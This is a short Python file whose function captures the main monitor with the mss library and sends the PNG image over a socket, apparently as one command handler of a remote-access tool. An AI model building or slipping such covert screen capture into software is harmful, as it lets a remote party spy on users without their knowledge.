import mss


def Screenshot(sock, args): # we don't need args
    screenshot = None
    with mss.mss() as screen:
        screenshot = screen.grab(screen.monitors[1])

    if screenshot:
        png = mss.tools.to_png(screenshot.rgb, screenshot.size, level = 9)
        sock.send(png)
    else:
        sock.send("FAIL")
